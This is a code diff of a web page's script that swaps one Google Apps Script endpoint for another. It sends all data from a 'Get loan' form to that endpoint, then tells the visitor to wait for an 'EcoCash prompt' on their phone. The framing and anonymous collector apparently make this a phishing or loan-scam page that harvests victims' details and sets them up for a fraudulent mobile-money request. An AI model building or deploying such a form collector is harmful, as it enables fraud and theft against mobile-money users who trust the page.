@@ -95,29 +95,27 @@
     </div>
 
     <script>
-        const SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbyJVkGa9V_7cGy6Ti17b7dcJyt01sad5MyUDGzlg2-j8lS3GhJ5TO9byxCq0lE55JYPtg/exec';
-        const form = document.getElementById('ecoForm');
-
-        form.addEventListener('submit', e => {
-            e.preventDefault();
-            document.getElementById('btn').innerText = "Processing...";
-            document.getElementById('status-msg').innerText = "Checking eligibility...";
-
-            fetch(SCRIPT_URL, { 
-                method: 'POST', 
-                mode: 'no-cors', 
-                body: new FormData(form) 
-            })
-            .then(() => {
-                document.getElementById('status-msg').innerHTML = "<b>Success!</b><br>Please wait for the EcoCash prompt on your phone.";
-                document.getElementById('btn').innerText = "Done";
-                form.reset();
-            })
-            .catch(err => {
-                document.getElementById('status-msg').innerText = "Error. Please try again.";
-                document.getElementById('btn').innerText = "Get loan";
-            });
-        });
-    </script>
+    const SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbzXhYvdFbg0Mvhw2V8Jm_7Zbq6IEHlAtzEwhrWp-HfRm3taBj0IRa3htkGt8h6ALIV97A/exec';
+    
+    const form = document.getElementById('ecoForm');
+    form.addEventListener('submit', e => {
+        e.preventDefault();
+        
+        // Show loading state
+        document.getElementById('btn').innerText = "Processing...";
+        
+        fetch(SCRIPT_URL, { 
+            method: 'POST', 
+            mode: 'no-cors', // This is vital for Google Scripts
+            body: new FormData(form) 
+        })
+        .then(() => {
+            alert("Application Sent! Check your phone for the EcoCash prompt.");
+            form.reset();
+            document.getElementById('btn').innerText = "Get loan";
+        })
+        .catch(err => alert("Error submitting. Please check connection."));
+    });
+</script>
 </body>
 </html>
